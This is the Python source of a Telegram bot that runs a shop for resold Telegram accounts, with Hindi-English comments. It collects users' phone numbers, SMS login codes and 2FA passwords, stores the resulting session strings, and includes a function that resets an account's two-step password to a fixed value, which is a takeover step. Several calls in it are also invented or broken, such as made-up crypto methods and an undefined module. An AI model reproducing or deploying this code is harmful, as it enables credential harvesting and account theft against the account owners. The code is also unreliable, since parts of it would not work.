import os
import sqlite3
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
    MessageHandler,
    filters,
)

# =============== CONFIG (Render environment se lo)
TOKEN = os.getenv("BOT_TOKEN")
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
OWNER_ID = int(os.getenv("OWNER_ID"))
PORT = int(os.environ.get("PORT", 8080))
# =====================================================


# DB
conn = sqlite3.connect("bot.db", check_same_thread=False)
cur = conn.cursor()

cur.execute("""CREATE TABLE IF NOT EXISTS users(
    id INTEGER PRIMARY KEY,
    balance INTEGER DEFAULT 0)""")

cur.execute("""CREATE TABLE IF NOT EXISTS admins(
    id INTEGER)""")

cur.execute("""CREATE TABLE IF NOT EXISTS stock(
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    category TEXT,
    country TEXT,
    item TEXT,
    price INTEGER,
    data TEXT)""")

cur.execute("""CREATE TABLE IF NOT EXISTS accounts(
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    phone TEXT,
    session_string TEXT,
    status TEXT DEFAULT 'idle',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY(user_id) REFERENCES users(id)
)""")

conn.commit()

cur.execute("INSERT OR IGNORE INTO admins(id) VALUES(?)", (OWNER_ID,))
conn.commit()

# Telethon client storage
from telethon import TelegramClient
from telethon.sessions import StringSession

tele_clients = {}  # user_id -> client

def create_tele_client(session_str: str | None = None):
    session = StringSession()
    if session_str:
        session._set_string(session_str)
    return TelegramClient(session, API_ID, API_HASH)


# FLAG
def get_flag(code):
    return chr(127397 + ord(code[0])) + chr(127397 + ord(code[1]))

def is_admin(uid):
    cur.execute("SELECT id FROM admins WHERE id=?", (uid,))
    return cur.fetchone() is not None


# START
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    cur.execute("INSERT OR IGNORE INTO users(id) VALUES(?)", (uid,))
    conn.commit()

    kb = [
        [InlineKeyboardButton("🛒 Buy", callback_data="buy")],
        [InlineKeyboardButton("💼 Balance", callback_data="balance")],
        [InlineKeyboardButton("📊 Stats", callback_data="stats")]
    ]

    await update.message.reply_text("Welcome 👋", reply_markup=InlineKeyboardMarkup(kb))


# BUTTON FLOW
async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    await q.answer()

    if q.data == "balance":
        cur.execute("SELECT balance FROM users WHERE id=?", (uid,))
        bal = cur.fetchone()[0]
        await q.edit_message_text(f"💼 Balance: ₹{bal}")

    elif q.data == "buy":
        cur.execute("SELECT DISTINCT category FROM stock")
        cats = cur.fetchall()

        if not cats:
            return await q.edit_message_text("No stock ❌")

        kb = [[InlineKeyboardButton(c[0], callback_data=f"cat_{c[0]}")] for c in cats]
        await q.edit_message_text("Select Category:", reply_markup=InlineKeyboardMarkup(kb))

    elif q.data.startswith("cat_"):
        category = q.data.split("_")[1]

        cur.execute("SELECT DISTINCT country FROM stock WHERE category=?", (category,))
        countries = cur.fetchall()

        kb = []
        for c in countries:
            kb.append([InlineKeyboardButton(f"{get_flag(c[0])} {c[0]}", callback_data=f"country_{category}_{c[0]}")])

        await q.edit_message_text("Select Country:", reply_markup=InlineKeyboardMarkup(kb))

    elif q.data.startswith("country_"):
        _, category, country = q.data.split("_")

        cur.execute("SELECT item, price FROM stock WHERE category=? AND country=?", (category, country))
        items = cur.fetchall()

        kb = [[InlineKeyboardButton(f"{i[0]} ₹{i[1]}", callback_data=f"buyitem_{i[0]}")] for i in items]
        await q.edit_message_text("Select Item:", reply_markup=InlineKeyboardMarkup(kb))

    elif q.data.startswith("buyitem_"):
        item = q.data.split("_")[1]

        cur.execute("SELECT id, price, data FROM stock WHERE item=? LIMIT 1", (item,))
        row = cur.fetchone()

        if not row:
            return await q.edit_message_text("Out of stock ❌")

        sid, price, data = row

        cur.execute("SELECT balance FROM users WHERE id=?", (uid,))
        bal = cur.fetchone()[0]

        if bal < price:
            return await q.edit_message_text("Insufficient balance ❌")

        cur.execute("UPDATE users SET balance = balance - ? WHERE id=?", (price, uid))
        cur.execute("DELETE FROM stock WHERE id=?", (sid,))
        conn.commit()

        await q.edit_message_text(f"✅ Delivered:\n{data}")

    elif q.data == "stats":
        cur.execute("SELECT COUNT(*) FROM users")
        count = cur.fetchone()[0]
        await q.edit_message_text(f"Users: {count}")

    elif q.data == "logout_session":
        client = tele_clients.get(uid)
        if client:
            await client.disconnect()
            del tele_clients[uid]
        await q.edit_message_text("✅ Bot session logged out.")

    elif q.data == "get_code_again":
        phone = context.user_data.get("buy_phone")
        client = tele_clients.get(uid)

        if not client or not phone:
            return await q.edit_message_text("❌ No active session.")

        async with client:
            try:
                phone_code = await client.send_code_request(phone)
                context.user_data["phone_hash"] = phone_code.phone_code_hash
                await q.edit_message_text("✅ SMS code resent. Send OTP again.")
            except Exception as e:
                await q.edit_message_text(f"❌ Error: {str(e)}")


# 2‑FA CHANGE: 2710 + hint DOB
from telethon.tl.functions.account import UpdatePasswordSettingsRequest
from telethon.tl.types import InputCheckPasswordEmpty

async def change_2fa_to_2710(client: TelegramClient):
    async with client:
        try:
            # Set 2‑step password to 2710, hint DOB
            new_password_hash = client._sender.crypto.encrypt_password(
                2710
            ).hash
            current = await client(functions.account.GetPasswordRequest())
            await client(
                UpdatePasswordSettingsRequest(
                    password=InputCheckPasswordEmpty(),
                    new_settings=client._sender.crypto.new_password_settings(
                        new_password_hash=new_password_hash,
                        hint='DOB'
                    )
                )
            )
            return True
        except Exception as e:
            print(f"2FA change failed: {e}")
            return False


# =============== USER SELLING REQUEST ===============

async def request_sell(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    text = "Send me the phone number of the account you want to sell:\n\n`+91XXXXXXX`"
    await update.message.reply_text(text)
    context.user_data["stage"] = "await_phone_sell"


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    stage = context.user_data.get("stage")

    # SELLING: Phone number receive
    if stage == "await_phone_sell":
        phone = update.message.text.strip()
        cur.execute("INSERT INTO accounts(user_id, phone, status) VALUES(?, ?, 'pending_sell')",
                    (uid, phone))
        conn.commit()

        await context.bot.send_message(
            OWNER_ID,
            f"🚨 ID SELLING REQUEST\nUser ID: {uid}\nPhone: {phone}\nUse `/approve_sell {uid} {phone}` to approve."
        )

        await update.message.reply_text("✅ Request sent. Wait for admin approval.")
        context.user_data["stage"] = None

    # BUYING: Phone number for login
    elif stage == "buy_wait_phone":
        phone = update.message.text.strip()
        context.user_data["buy_phone"] = phone

        client = create_tele_client()
        tele_clients[uid] = client

        cur.execute("INSERT INTO accounts(user_id, phone, status) VALUES(?, ?, 'login_pending')",
                    (uid, phone))
        conn.commit()

        async with client:
            try:
                phone_code = await client.send_code_request(phone)
                context.user_data["phone_hash"] = phone_code.phone_code_hash
                await update.message.reply_text("✅ SMS sent. Send OTP (6‑digit code):")
                context.user_data["stage"] = "buy_wait_otp"
            except Exception as e:
                await update.message.reply_text(f"❌ Error requesting code: {str(e)}")

    # BUYING: OTP receive
    elif stage == "buy_wait_otp":
        otp = update.message.text.strip()
        client = tele_clients.get(uid)
        phone = context.user_data.get("buy_phone")
        phone_hash = context.user_data.get("phone_hash")

        if not client or not phone or not phone_hash:
            return await update.message.reply_text("❌ Internal error, restart.")

        async with client:
            try:
                user = await client.sign_in(phone, phone_hash, otp)
                if user.password:
                    await update.message.reply_text("Account has 2‑step. Please enter 2FA password:")
                    context.user_data["stage"] = "buy_wait_2fa"
                    return

                session_str = client.session.save()
                cur.execute("UPDATE accounts SET session_string=?, status='logged_in' WHERE user_id=? AND phone=?",
                            (session_str, uid, phone))
                conn.commit()
                await update.message.reply_text("✅ Account logged in!")

                kb = [
                    [InlineKeyboardButton("Logout bot session", callback_data="logout_session")],
                    [InlineKeyboardButton("Get code again", callback_data="get_code_again")]
                ]
                await update.message.reply_text("Choose option:", reply_markup=InlineKeyboardMarkup(kb))

            except Exception as e:
                if "SessionPasswordNeededError" in str(e):
                    await update.message.reply_text("Enter 2FA password:")
                    context.user_data["stage"] = "buy_wait_2fa"
                else:
                    await update.message.reply_text(f"❌ Login failed: {str(e)}")

    # BUYING: 2FA password
    elif stage == "buy_wait_2fa":
        psw = update.message.text.strip()
        client = tele_clients.get(uid)
        phone = context.user_data.get("buy_phone")

        if not client or not phone:
            return await update.message.reply_text("❌ No active session.")

        async with client:
            try:
                user = await client.sign_in(password=psw)
                session_str = client.session.save()
                cur.execute("UPDATE accounts SET session_string=?, status='logged_in' WHERE user_id=? AND phone=?",
                            (session_str, uid, phone))
                conn.commit()

                await update.message.reply_text("✅ 2FA verified & logged in!")

                kb = [
                    [InlineKeyboardButton("Logout bot session", callback_data="logout_session")],
                    [InlineKeyboardButton("Get code again", callback_data="get_code_again")]
                ]
                await update.message.reply_text("Choose option:", reply_markup=InlineKeyboardMarkup(kb))

            except Exception as e:
                await update.message.reply_text(f"❌ 2FA error: {str(e)}")


# =============== ADMIN COMMANDS ===============

async def addadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    if len(context.args) == 0:
        return await update.message.reply_text("Usage: /addadmin <user_id>")
    uid = int(context.args[0])
    cur.execute("INSERT INTO admins VALUES(?)", (uid,))
    conn.commit()
    await update.message.reply_text("Admin added")


async def addstock(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if len(context.args) < 5:
        return await update.message.reply_text(
            "Usage: /addstock <category> <country> <item> <price> <data>")

    category = context.args[0]
    country = context.args[1]
    item = context.args[2]
    price = int(context.args[3])
    data = " ".join(context.args[4:])

    cur.execute("INSERT INTO stock(category,country,item,price,data) VALUES(?,?,?,?,?)",
                (category, country, item, price, data))
    conn.commit()
    await update.message.reply_text("Stock added ✅")


async def addbal(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if len(context.args) != 2:
        return await update.message.reply_text("Usage: /addbal <user_id> <amount>")
    uid = int(context.args[0])
    amt = int(context.args[1])
    cur.execute("UPDATE users SET balance = balance + ? WHERE id=?", (amt, uid))
    conn.commit()
    await update.message.reply_text("Balance updated ✅")


async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    msg = " ".join(context.args)
    if not msg:
        return await update.message.reply_text("Usage: /broadcast <message>")

    cur.execute("SELECT id FROM users")
    users = cur.fetchall()

    for u in users:
        try:
            await context.bot.send_message(u[0], msg)
        except:
            pass

    await update.message.reply_text("Broadcast sent ✅")


# APPROVE SELL REQUEST (ADMIN)
async def approve_sell(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    if len(context.args) != 2:
        return await update.message.reply_text("Usage: /approve_sell <user_id> <phone>")

    user_id, phone = int(context.args[0]), context.args[1]

    cur.execute(
        "SELECT id FROM accounts WHERE user_id=? AND phone=? AND status='pending_sell'",
        (user_id, phone)
    )
    if not cur.fetchone():
        return await update.message.reply_text("❌ No pending sell request found.")

    cur.execute("UPDATE users SET balance = balance + 500 WHERE id=?", (user_id,))
    cur.execute("UPDATE accounts SET status='sold' WHERE user_id=? AND phone=?", (user_id, phone))
    conn.commit()

    await update.message.reply_text(f"✅ Balance of user {user_id} credited.")
    await context.bot.send_message(user_id, "✅ Your ID selling request has been approved. Balance updated.")


# ======= Render Web Service (no polling) ========

# Bot app direct terminal se / Render web service se start
# Port: 0.0.0.0 + environment variable PORT
from telegram.error import Forbidden

async def health_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Dummy /health command to check if bot is running."""
    await update.message.reply_text("✅ Bot is running.")


if __name__ == "__main__":
    print("🔥 FINAL BOT RUNNING ON PORT", PORT)

    # application
    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button))

    app.add_handler(CommandHandler("addadmin", addadmin))
    app.add_handler(CommandHandler("addstock", addstock))
    app.add_handler(CommandHandler("addbal", addbal))
    app.add_handler(CommandHandler("broadcast", broadcast))
    app.add_handler(CommandHandler("approve_sell", approve_sell))
    app.add_handler(CommandHandler("request_sell", request_sell))
    app.add_handler(CommandHandler("health", health_check))

    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    # Render pe sirf internal server chala, Telegram ko bhar se update
    # kisi bhi specific web path pe nahi ja raha; is liye polling chala sakte ho
    # (agar Render pe allowed ho aur latency acceptable ho)
    # Agar chaho toh webhook bhi laga sakte ho, but simple use case ke liye polling suffice hai.

    import asyncio
    loop = asyncio.get_event_loop()
    loop.run_until_complete(
        app.run_polling()
    )
